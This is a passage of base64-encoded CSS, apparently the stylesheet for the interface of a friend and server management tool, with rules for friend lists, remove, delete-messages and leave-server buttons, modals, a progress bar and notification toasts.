zcGxheTogZmxleCAhaW1wb3J0YW50OwogICAgICAgICAgICBhbGlnbi1pdGVtczogY2VudGVyICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGdhcDogMTJweCAhaW1wb3J0YW50OwogICAgICAgICAgICB0cmFuc2l0aW9uOiBhbGwgMC4xNXMgZWFzZSAhaW1wb3J0YW50OwogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMDYpICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLWZyaWVuZDpob3ZlciwKICAgICAgICAuZGZtLXNlcnZlcjpob3ZlciB7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4wOCkgIWltcG9ydGFudDsKICAgICAgICAgICAgYm9yZGVyLWNvbG9yOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMSkgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tZnJpZW5kLnNlbGVjdGVkLAogICAgICAgIC5kZm0tc2VydmVyLnNlbGVjdGVkIHsKICAgICAgICAgICAgYmFja2dyb3VuZDogcmdiYSg4OCwgMTAxLCAyNDIsIDAuMTUpICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJvcmRlci1jb2xvcjogcmdiYSg4OCwgMTAxLCAyNDIsIDAuNCkgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tY2hlY2tib3ggewogICAgICAgICAgICB3aWR0aDogMThweCAhaW1wb3J0YW50OwogICAgICAgICAgICBoZWlnaHQ6IDE4cHggIWltcG9ydGFudDsKICAgICAgICAgICAgbWluLXdpZHRoOiAxOHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIG1pbi1oZWlnaHQ6IDE4cHggIWltcG9ydGFudDsKICAgICAgICAgICAgY3Vyc29yOiBwb2ludGVyICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGFjY2VudC1jb2xvcjogIzU4NjVmMiAhaW1wb3J0YW50OwogICAgICAgICAgICBmbGV4LXNocmluazogMCAhaW1wb3J0YW50OwogICAgICAgICAgICBtYXJnaW46IDAgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tYXZhdGFyLAogICAgICAgIC5kZm0tc2VydmVyLWljb24gewogICAgICAgICAgICB3aWR0aDogNDBweCAhaW1wb3J0YW50OwogICAgICAgICAgICBoZWlnaHQ6IDQwcHggIWltcG9ydGFudDsKICAgICAgICAgICAgbWluLXdpZHRoOiA0MHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIG1pbi1oZWlnaHQ6IDQwcHggIWltcG9ydGFudDsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogNTAlICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGZsZXgtc2hyaW5rOiAwICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJvcmRlcjogMnB4IHNvbGlkIHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4xKSAhaW1wb3J0YW50OwogICAgICAgICAgICBvYmplY3QtZml0OiBjb3ZlciAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS1pbmZvIHsKICAgICAgICAgICAgZmxleDogMSAhaW1wb3J0YW50OwogICAgICAgICAgICBtaW4td2lkdGg6IDAgIWltcG9ydGFudDsKICAgICAgICAgICAgZGlzcGxheTogZmxleCAhaW1wb3J0YW50OwogICAgICAgICAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLW5hbWUgewogICAgICAgICAgICBjb2xvcjogI2ZmZmZmZiAhaW1wb3J0YW50OwogICAgICAgICAgICBmb250LXNpemU6IDE0cHggIWltcG9ydGFudDsKICAgICAgICAgICAgZm9udC13ZWlnaHQ6IDYwMCAhaW1wb3J0YW50OwogICAgICAgICAgICB3aGl0ZS1zcGFjZTogbm93cmFwICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIG92ZXJmbG93OiBoaWRkZW4gIWltcG9ydGFudDsKICAgICAgICAgICAgdGV4dC1vdmVyZmxvdzogZWxsaXBzaXMgIWltcG9ydGFudDsKICAgICAgICAgICAgbWFyZ2luOiAwICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHBhZGRpbmc6IDAgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tZnJpZW5kLWFjdGlvbnMsCiAgICAgICAgLmRmbS1zZXJ2ZXItYWN0aW9ucyB7CiAgICAgICAgICAgIGRpc3BsYXk6IGZsZXggIWltcG9ydGFudDsKICAgICAgICAgICAgZ2FwOiA4cHggIWltcG9ydGFudDsKICAgICAgICAgICAgZmxleC1zaHJpbms6IDAgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tcmVtb3ZlLAogICAgICAgIC5kZm0tZGVsZXRlLW1lc3NhZ2VzLAogICAgICAgIC5kZm0tbGVhdmUtc2VydmVyIHsKICAgICAgICAgICAgYm9yZGVyOiBub25lICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHBhZGRpbmc6IDhweCAxNnB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDZweCAhaW1wb3J0YW50OwogICAgICAgICAgICBmb250LXNpemU6IDEzcHggIWltcG9ydGFudDsKICAgICAgICAgICAgZm9udC13ZWlnaHQ6IDYwMCAhaW1wb3J0YW50OwogICAgICAgICAgICBjdXJzb3I6IHBvaW50ZXIgIWltcG9ydGFudDsKICAgICAgICAgICAgdHJhbnNpdGlvbjogYWxsIDAuMTVzIGVhc2UgIWltcG9ydGFudDsKICAgICAgICAgICAgY29sb3I6ICNmZmZmZmYgIWltcG9ydGFudDsKICAgICAgICAgICAgd2hpdGUtc3BhY2U6IG5vd3JhcCAhaW1wb3J0YW50OwogICAgICAgICAgICBtYXJnaW46IDAgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tcmVtb3ZlIHsKICAgICAgICAgICAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDEzNWRlZywgI2VkNDI0NSAwJSwgI2MwMzUzNyAxMDAlKSAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS1kZWxldGUtbWVzc2FnZXMgewogICAgICAgICAgICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCAjZmFhNjFhIDAlLCAjZDY4YTE1IDEwMCUpICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLWxlYXZlLXNlcnZlciB7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxMzVkZWcsICNlZDQyNDUgMCUsICNjMDM1MzcgMTAwJSkgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tcmVtb3ZlOmhvdmVyLAogICAgICAgIC5kZm0tZGVsZXRlLW1lc3NhZ2VzOmhvdmVyLAogICAgICAgIC5kZm0tbGVhdmUtc2VydmVyOmhvdmVyIHsKICAgICAgICAgICAgZmlsdGVyOiBicmlnaHRuZXNzKDEuMSkgIWltcG9ydGFudDsKICAgICAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKC0xcHgpICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLXJlbW92ZTphY3RpdmUsCiAgICAgICAgLmRmbS1kZWxldGUtbWVzc2FnZXM6YWN0aXZlLAogICAgICAgIC5kZm0tbGVhdmUtc2VydmVyOmFjdGl2ZSB7CiAgICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgwKSAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS1yZW1vdmU6ZGlzYWJsZWQsCiAgICAgICAgLmRmbS1kZWxldGUtbWVzc2FnZXM6ZGlzYWJsZWQsCiAgICAgICAgLmRmbS1sZWF2ZS1zZXJ2ZXI6ZGlzYWJsZWQgewogICAgICAgICAgICBvcGFjaXR5OiAwLjUgIWltcG9ydGFudDsKICAgICAgICAgICAgY3Vyc29yOiBub3QtYWxsb3dlZCAhaW1wb3J0YW50OwogICAgICAgICAgICB0cmFuc2Zvcm06IG5vbmUgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tbG9hZGluZyB7CiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlciAhaW1wb3J0YW50OwogICAgICAgICAgICBjb2xvcjogIzg4ODg4OCAhaW1wb3J0YW50OwogICAgICAgICAgICBwYWRkaW5nOiA2MHB4IDIwcHggIWltcG9ydGFudDsKICAgICAgICAgICAgZm9udC1zaXplOiAxNHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiA1MDAgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tbG9hZGluZzo6YWZ0ZXIgewogICAgICAgICAgICBjb250ZW50OiAnLi4uJyAhaW1wb3J0YW50OwogICAgICAgICAgICBhbmltYXRpb246IGRvdHMgMS41cyBzdGVwcyg0LCBlbmQpIGluZmluaXRlICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLWVtcHR5IHsKICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGNvbG9yOiAjNjY2NjY2ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHBhZGRpbmc6IDYwcHggMjBweCAhaW1wb3J0YW50OwogICAgICAgICAgICBmb250LXNpemU6IDE0cHggIWltcG9ydGFudDsKICAgICAgICAgICAgZm9udC13ZWlnaHQ6IDUwMCAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS1tb2RhbCB7CiAgICAgICAgICAgIHBvc2l0aW9uOiBmaXhlZCAhaW1wb3J0YW50OwogICAgICAgICAgICB0b3A6IDAgIWltcG9ydGFudDsKICAgICAgICAgICAgbGVmdDogMCAhaW1wb3J0YW50OwogICAgICAgICAgICB3aWR0aDogMTAwJSAhaW1wb3J0YW50OwogICAgICAgICAgICBoZWlnaHQ6IDEwMCUgIWltcG9ydGFudDsKICAgICAgICAgICAgYmFja2dyb3VuZDogcmdiYSgwLCAwLCAwLCAwLjgpICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGRpc3BsYXk6IGZsZXggIWltcG9ydGFudDsKICAgICAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlciAhaW1wb3J0YW50OwogICAgICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlciAhaW1wb3J0YW50OwogICAgICAgICAgICB6LWluZGV4OiAxMDAwMDAwICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHBhZGRpbmc6IDIwcHggIWltcG9ydGFudDsKICAgICAgICAgICAgYmFja2Ryb3AtZmlsdGVyOiBibHVyKDRweCkgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tbW9kYWwtY29udGVudCB7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxNDVkZWcsICMxYTFhMWEgMCUsICMxNDE0MTQgMTAwJSkgIWltcG9ydGFudDsKICAgICAgICAgICAgcGFkZGluZzogMjRweCAhaW1wb3J0YW50OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiAxMnB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIG1heC13aWR0aDogNDIwcHggIWltcG9ydGFudDsKICAgICAgICAgICAgd2lkdGg6IDEwMCUgIWltcG9ydGFudDsKICAgICAgICAgICAgYW5pbWF0aW9uOiBtb2RhbEZhZGVJbiAwLjJzIGVhc2UgIWltcG9ydGFudDsKICAgICAgICAgICAgYm94LXNoYWRvdzogMCA4cHggMzJweCByZ2JhKDAsIDAsIDAsIDAuNSkgIWltcG9ydGFudDsKICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjEpICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLW1vZGFsLXRpdGxlIHsKICAgICAgICAgICAgY29sb3I6ICNmZmZmZmYgIWltcG9ydGFudDsKICAgICAgICAgICAgZm9udC1zaXplOiAxOHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiA3MDAgIWltcG9ydGFudDsKICAgICAgICAgICAgbWFyZ2luOiAwIDAgMTJweCAwICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHBhZGRpbmc6IDAgIWltcG9ydGFudDsKICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLW1vZGFsLXRleHQgewogICAgICAgICAgICBjb2xvcjogI2IwYjBiMCAhaW1wb3J0YW50OwogICAgICAgICAgICBmb250LXNpemU6IDE0cHggIWltcG9ydGFudDsKICAgICAgICAgICAgbWFyZ2luOiAwIDAgMjBweCAwICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHBhZGRpbmc6IDAgIWltcG9ydGFudDsKICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGxpbmUtaGVpZ2h0OiAxLjUgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tbW9kYWwtYWN0aW9ucyB7CiAgICAgICAgICAgIGRpc3BsYXk6IGZsZXggIWltcG9ydGFudDsKICAgICAgICAgICAgZ2FwOiAxMHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLW1vZGFsLWFjdGlvbnMgLmRmbS1idG4gewogICAgICAgICAgICBmbGV4OiAxICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIG1heC13aWR0aDogMTUwcHggIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tcHJvZ3Jlc3MtY29udGFpbmVyIHsKICAgICAgICAgICAgYmFja2dyb3VuZDogcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjA1KSAhaW1wb3J0YW50OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA4cHggIWltcG9ydGFudDsKICAgICAgICAgICAgcGFkZGluZzogMTZweCAhaW1wb3J0YW50OwogICAgICAgICAgICBtYXJnaW4tdG9wOiAxMnB4ICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLXByb2dyZXNzLXRleHQgewogICAgICAgICAgICBjb2xvcjogI2ZmZmZmZiAhaW1wb3J0YW50OwogICAgICAgICAgICBmb250LXNpemU6IDE0cHggIWltcG9ydGFudDsKICAgICAgICAgICAgZm9udC13ZWlnaHQ6IDYwMCAhaW1wb3J0YW50OwogICAgICAgICAgICBtYXJnaW46IDAgMCAxMHB4IDAgIWltcG9ydGFudDsKICAgICAgICAgICAgcGFkZGluZzogMCAhaW1wb3J0YW50OwogICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXIgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tcHJvZ3Jlc3MtYmFyLWNvbnRhaW5lciB7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHJnYmEoMCwgMCwgMCwgMC4zKSAhaW1wb3J0YW50OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA0cHggIWltcG9ydGFudDsKICAgICAgICAgICAgaGVpZ2h0OiA2cHggIWltcG9ydGFudDsKICAgICAgICAgICAgb3ZlcmZsb3c6IGhpZGRlbiAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS1wcm9ncmVzcy1iYXIgewogICAgICAgICAgICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoOTBkZWcsICM1ODY1ZjIsICM0NzUyYzQpICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGhlaWdodDogMTAwJSAhaW1wb3J0YW50OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA0cHggIWltcG9ydGFudDsKICAgICAgICAgICAgdHJhbnNpdGlvbjogd2lkdGggMC4zcyBlYXNlICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHdpZHRoOiAwICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAjZGZtLW5vdGlmaWNhdGlvbi1jb250YWluZXIgewogICAgICAgICAgICBwb3NpdGlvbjogZml4ZWQgIWltcG9ydGFudDsKICAgICAgICAgICAgYm90dG9tOiAyMHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHJpZ2h0OiAyMHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHotaW5kZXg6IDk5OTk5OTkgIWltcG9ydGFudDsKICAgICAgICAgICAgZGlzcGxheTogZmxleCAhaW1wb3J0YW50OwogICAgICAgICAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGdhcDogMTBweCAhaW1wb3J0YW50OwogICAgICAgICAgICBwb2ludGVyLWV2ZW50czogbm9uZSAhaW1wb3J0YW50OwogICAgICAgICAgICBtYXgtd2lkdGg6IDM2MHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLW5vdGlmaWNhdGlvbiB7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxMzVkZWcsICMxYTFhMWEgMCUsICMxNDE0MTQgMTAwJSkgIWltcG9ydGFudDsKICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjEpICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDhweCAhaW1wb3J0YW50OwogICAgICAgICAgICBwYWRkaW5nOiAxNHB4IDE2cHggIWltcG9ydGFudDsKICAgICAgICAgICAgbWluLXdpZHRoOiAzMDBweCAhaW1wb3J0YW50OwogICAgICAgICAgICBhbmltYXRpb246IHNsaWRlSW5SaWdodCAwLjNzIGVhc2UgIWltcG9ydGFudDsKICAgICAgICAgICAgcG9pbnRlci1ldmVudHM6IGFsbCAhaW1wb3J0YW50OwogICAgICAgICAgICBkaXNwbGF5OiBmbGV4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXIgIWltcG9ydGFudDsKICAgICAgICAgICAgZ2FwOiAxMnB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHBvc2l0aW9uOiByZWxhdGl2ZSAhaW1wb3J0YW50OwogICAgICAgICAgICBvdmVyZmxvdzogaGlkZGVuICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJveC1zaGFkb3c6IDAgNHB4IDE2cHggcmdiYSgwLCAwLCAwLCAwLjQpICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLW5vdGlmaWNhdGlvbjo6YmVmb3JlIHsKICAgICAgICAgICAgY29udGVudDogJycgIWltcG9ydGFudDsKICAgICAgICAgICAgcG9zaXRpb246IGFic29sdXRlICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGxlZnQ6IDAgIWltcG9ydGFudDsKICAgICAgICAgICAgdG9wOiAwICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGhlaWdodDogMTAwJSAhaW1wb3J0YW50OwogICAgICAgICAgICB3aWR0aDogNHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHZhcigtLW5vdGlmaWNhdGlvbi1jb2xvcikgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tbm90aWZpY2F0aW9uLnJlbW92aW5nIHsKICAgICAgICAgICAgYW5pbWF0aW9uOiBzbGlkZU91dFJpZ2h0IDAuMjVzIGVhc2UgZm9yd2FyZHMgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tbm90aWZpY2F0aW9uLnN1Y2Nlc3MgeyAtLW5vdGlmaWNhdGlvbi1jb2xvcjogIzQzYjU4MSAhaW1wb3J0YW50OyB9CiAgICAgICAgLmRmbS1ub3RpZmljYXRpb24uZXJyb3IgeyAtLW5vdGlmaWNhdGlvbi1jb2xvcjogI2VkNDI0NSAhaW1wb3J0YW50OyB9CiAgICAgICAgLmRmbS1ub3RpZmljYXRpb24ud2FybmluZyB7IC0tbm90aWZpY2F0aW9uLWNvbG9yOiAjZmFhNjFhICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGZtLW5vdGlmaWNhdGlvbi5pbmZvIHsgLS1ub3RpZmljYXRpb24tY29sb3I6ICM1ODY1ZjIgIWltcG9ydGFudDsgfQogICAgICAgIC5kZm0tbm90aWZpY2F0aW9uLmZyaWVuZC1yZW1vdmVkLAogICAgICAgIC5kZm0tbm90aWZpY2F0aW9uLnNlcnZlci1sZWZ0IHsgLS1ub3RpZmljYXRpb24tY29sb3I6ICNlZDQyNDUgIWltcG9ydGFudDsgfQoKICAgICAgICAuZGZtLW5vdGlmaWNhdGlvbi1pY29uIHsKICAgICAgICAgICAgZm9udC1zaXplOiAyMHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGZsZXgtc2hyaW5rOiAwICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLW5vdGlmaWNhdGlvbi5zdWNjZXNzIC5kZm0tbm90aWZpY2F0aW9uLWljb24geyBjb2xvcjogIzQzYjU4MSAhaW1wb3J0YW50OyB9CiAgICAgICAgLmRmbS1ub3RpZmljYXRpb24uZXJyb3IgLmRmbS1ub3RpZmljYXRpb24taWNvbiB7IGNvbG9yOiAjZWQ0MjQ1ICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGZtLW5vdGlmaWNhdGlvbi53YXJuaW5nIC5kZm0tbm90aWZpY2F0aW9uLWljb24geyBjb2xvcjogI2ZhYTYxYSAhaW1wb3J0YW50OyB9CiAgICAgICAgLmRmbS1ub3RpZmljYXRpb24uaW5mbyAuZGZtLW5vdGlmaWNhdGlvbi1pY29uIHsgY29sb3I6ICM1ODY1ZjIgIWltcG9ydGFudDsgfQoKICAgICAgICAuZGZtLW5vdGlmaWNhdGlvbi1jb250ZW50IHsKICAgICAgICAgICAgZmxleDogMSAhaW1wb3J0YW50OwogICAgICAgICAgICBtaW4td2lkdGg6IDAgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tbm90aWZpY2F0aW9uLXRpdGxlIHsKICAgICAgICAgICAgY29sb3I6ICNmZmZmZmYgIWltcG9ydGFudDsKICAgICAgICAgICAgZm9udC1zaXplOiAxNHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiA2MDAgIWltcG9ydGFudDsKICAgICAgICAgICAgbWFyZ2luOiAwIDAgMnB4IDAgIWltcG9ydGFudDsKICAgICAgICAgICAgcGFkZGluZzogMCAhaW1wb3J0YW50OwogICAgICAgICAgICBsaW5lLWhlaWdodDogMS4zICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLW5vdGlmaWNhdGlvbi1tZXNzYWdlIHsKICAgICAgICAgICAgY29sb3I6ICNiMGIwYjAgIWltcG9ydGFudDsKICAgICAgICAgICAgZm9udC1zaXplOiAxM3B4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGxpbmUtaGVpZ2h0OiAxLjQgIWltcG9ydGFudDsKICAgICAgICAgICAgd29yZC13cmFwOiBicmVhay13b3JkICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIG1hcmdpbjogMCAhaW1wb3J0YW50OwogICAgICAgICAgICBwYWRkaW5nOiAwICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLW5vdGlmaWNhdGlvbi1jbG9zZSB7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4wOCkgIWltcG9ydGFudDsKICAgICAgICAgICAgYm9yZGVyOiBub25lICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGNvbG9yOiAjODg4ODg4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGN1cnNvcjogcG9pbnRlciAhaW1wb3J0YW50OwogICAgICAgICAgICB3aWR0aDogMjRweCAhaW1wb3J0YW50OwogICAgICAgICAgICBoZWlnaHQ6IDI0cHggIWltcG9ydGFudDsKICAgICAgICAgICAgbWluLXdpZHRoOiAyNHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIG1pbi1oZWlnaHQ6IDI0cHggIWltcG9ydGFudDsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogNHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHRyYW5zaXRpb246IGFsbCAwLjE1cyBlYXNlICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMTRweCAhaW1wb3J0YW50OwogICAgICAgICAgICBkaXNwbGF5OiBmbGV4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXIgIWltcG9ydGFudDsKICAgICAgICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXIgIWltcG9ydGFudDsKICAgICAgICAgICAgZmxleC1zaHJpbms6IDAgIWltcG9ydGFudDsKICAgICAgICAgICAgcGFkZGluZzogMCAhaW1wb3J0YW50OwogICAgICAgICAgICBtYXJnaW46IDAgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tbm90aWZpY2F0aW9uLWNsb3NlOmhvdmVyIHsKICAgICAgICAgICAgYmFja2dyb3VuZDogcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjE1KSAhaW1wb3J0YW50OwogICAgICAgICAgICBjb2xvcjogI2ZmZmZmZiAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS1mcmllbmQtcmVtb3ZlZC1jb250ZW50LAogICAgICAgIC5kZm0tc2VydmVyLWxlZnQtY29udGVudCB7CiAgICAgICAgICAgIGRpc3BsYXk6IGZsZXggIWltcG9ydGFudDsKICAgICAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlciAhaW1wb3J0YW50OwogICAgICAgICAgICBnYXA6IDEwcHggIWltcG9ydGFudDsKICAgICAgICAgICAgd2lkdGg6IDEwMCUgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tZnJpZW5kLXJlbW92ZWQtYXZhdGFyLAogICAgICAgIC5kZm0tc2VydmVyLWxlZnQtaWNvbiB7CiAgICAgICAgICAgIHdpZHRoOiAzNnB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGhlaWdodDogMzZweCAhaW1wb3J0YW50OwogICAgICAgICAgICBtaW4td2lkdGg6IDM2cHggIWltcG9ydGFudDsKICAgICAgICAgICAgbWluLWhlaWdodDogMzZweCAhaW1wb3J0YW50OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA1MCUgIWltcG9ydGFudDsKICAgICAgICAgICAgYm9yZGVyOiAycHggc29saWQgcmdiYSgyMzcsIDY2LCA2OSwgMC4zKSAhaW1wb3J0YW50OwogICAgICAgICAgICBmbGV4LXNocmluazogMCAhaW1wb3J0YW50OwogICAgICAgICAgICBvYmplY3QtZml0OiBjb3ZlciAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS1zZXJ2ZXItbGVmdC1pY29uIHsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogOHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLWZyaWVuZC1yZW1vdmVkLWluZm8sCiAgICAgICAgLmRmbS1zZXJ2ZXItbGVmdC1pbmZvIHsKICAgICAgICAgICAgZmxleDogMSAhaW1wb3J0YW50OwogICAgICAgICAgICBtaW4td2lkdGg6IDAgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tZnJpZW5kLXJlbW92ZWQtbmFtZSwKICAgICAgICAuZGZtLXNlcnZlci1sZWZ0LW5hbWUgewogICAgICAgICAgICBjb2xvcjogI2ZmZmZmZiAhaW1wb3J0YW50OwogICAgICAgICAgICBmb250LXNpemU6IDE0cHggIWltcG9ydGFudDsKICAgICAgICAgICAgZm9udC13ZWlnaHQ6IDYwMCAhaW1wb3J0YW50OwogICAgICAgICAgICBtYXJnaW46IDAgMCAycHggMCAhaW1wb3J0YW50OwogICAgICAgICAgICBwYWRkaW5nOiAwICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHdoaXRlLXNwYWNlOiBub3dyYXAgIWltcG9ydGFudDsKICAgICAgICAgICAgb3ZlcmZsb3c6IGhpZGRlbiAhaW1wb3J0YW50OwogICAgICAgICAgICB0ZXh0LW92ZXJmbG93OiBlbGxpcHNpcyAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS1mcmllbmQtcmVtb3ZlZC10ZXh0LAogICAgICAgIC5kZm0tc2VydmVyLWxlZnQtdGV4dCB7CiAgICAgICAgICAgIGNvbG9yOiAjODg4ODg4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMTJweCAhaW1wb3J0YW50OwogICAgICAgICAgICBtYXJnaW46IDAgIWltcG9ydGFu